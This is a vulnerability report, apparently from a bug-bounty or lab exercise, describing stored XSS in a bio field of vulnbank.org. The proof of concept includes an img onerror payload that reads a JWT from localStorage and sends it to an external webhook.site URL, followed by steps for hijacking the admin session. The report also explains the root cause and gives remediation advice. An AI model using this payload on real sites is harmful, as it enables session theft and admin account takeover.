# Stored XSS via Bio Field Leading to Admin Account Takeover (JWT Theft)

* **Vulnerability Type:** CWE-79 (Stored XSS) & CWE-312 (Cleartext Storage of Sensitive Information)
* **Impact Category:** Account Takeover / Privilege Escalation
* **Target / Platform:** `vulnbank.org`
* **Severity / CVSS:** Critical
* **Affected Endpoint:** Bio update field in the profile settings page

---

## 📌 Summary

The application fails to sanitize HTML input in the user bio field, resulting in a Stored Cross-Site Scripting (XSS) vulnerability. Furthermore, the application stores authentication tokens (JWT) insecurely in the browser's `localStorage`. 

By injecting a malicious JavaScript payload into the bio, an attacker can extract the admin's JWT from `localStorage` whenever the admin views the profile. The token is then exfiltrated to an external webhook, allowing the attacker to completely take over the administrator account.

---

## 📝 Description

The profile bio feature accepts raw HTML and renders it without proper sanitization or output encoding. 

Instead of relying on cookies, the application stores the session JWT in `window.localStorage`. Because `localStorage` is fully accessible via JavaScript, it is highly vulnerable to XSS. The attacker uses an `<img>` tag with an invalid `src` to trigger an `onerror` event handler. This handler executes JavaScript that reads the `jwt_token` from `localStorage` and appends it as a query parameter to an external image request pointing to an attacker-controlled listener (`webhook.site`).

When the administrator reviews the attacker's bio, the payload executes silently in the background, exfiltrating the token and granting the attacker full administrative access.

---

## 🎯 Impact

A successful exploitation leads to complete Admin Account Takeover (ATO). 

Consequences include:
* Full privilege escalation.
* Unauthorized access to sensitive backend data and administrative features.
* The ability to perform actions on behalf of the admin without needing their credentials.

---

## 🛠️ Proof of Concept

### Attack Scenario

1. Log in to the application using a standard user account.
2. Navigate to the profile settings page.
3. In the **Update your bio** text area, inject the following XSS payload:

```html
<img
  src="x"
  onerror="
    var jwt = window.localStorage.getItem('jwt_token');
    if (jwt) {
      new Image().src =
        'https://webhook.site/2b8805eb-0193-4526-b927-f67a6e1ad842?token=' +
        encodeURIComponent(jwt);
    }
  "
/>
```

4. Save the bio. 

![Payload Injection](1.png)

5. Wait for the administrator to view the profile.
6. Check the `webhook.site` dashboard. The admin's browser will trigger the `onerror` payload and send an HTTP GET request containing the JWT.

![Captured Token](2.png)

7. Replace your current local JWT with the stolen admin JWT to hijack the session.

---

### Decoded JWT Payload

Decoding the captured JWT (`eyJ0eXAi...mHZkQINHMO5o`) confirms the privilege escalation:

```json
{
  "user_id": 6,
  "username": "admin",
  "is_admin": true,
  "iat": 1786199593
}
```

---

## 🔍 Root Cause Analysis

This vulnerability exists due to two intersecting security failures (a common scenario in AppSec):

1. **Missing Sanitization:** The application renders user-supplied content in the bio field directly into the DOM without sanitization (e.g., using DOMPurify) or HTML entity encoding.
2. **Insecure Token Storage:** The application stores the JWT in `localStorage`. Unlike cookies, `localStorage` cannot be protected with the `HttpOnly` flag, making any stored secrets easily extractable via XSS. 

---

## ✅ Evidence

* The bio field allows the execution of arbitrary JavaScript via HTML event handlers (`onerror`).
* The JWT is stored in `localStorage` under the key `jwt_token`.
* The `webhook.site` log successfully captured the token from the victim's session.
* The decoded token explicitly shows `"is_admin": true`.

---

## 📊 Attack Flow

```text
Attacker injects XSS payload into Bio
      │
      ▼
Payload is stored in the database
      │
      ▼
Admin navigates to Attacker's profile
      │
      ▼
Browser attempts to load <img src="x"> and fails
      │
      ▼
'onerror' JS executes, reading localStorage.getItem('jwt_token')
      │
      ▼
JS forces a background request to webhook.site containing the JWT
      │
      ▼
Attacker retrieves JWT, injects it into their browser, and becomes Admin
```

---

## 🛡️ Remediation

To properly fix this, implement defense-in-depth by addressing both the XSS and the token storage mechanism:

1. **Sanitize Input/Output:** 
   * Implement strict context-aware output encoding. 
   * If HTML formatting is required, use a robust sanitization library like DOMPurify to strip dangerous tags (`<script>`, `<object>`) and event handlers (`onerror`, `onload`).
2. **Secure Session Storage:** 
   * **Do not store sensitive tokens in `localStorage`.** Move the JWT to an `HttpOnly`, `Secure`, and `SameSite=Strict` cookie. This mitigates the impact of XSS, as JavaScript will no longer be able to read the token directly.
3. **Implement CSP:** 
   * Deploy a strict Content Security Policy (CSP) to restrict where external resources (like images or scripts) can be loaded from or sent to, which would block the exfiltration to `webhook.site`.
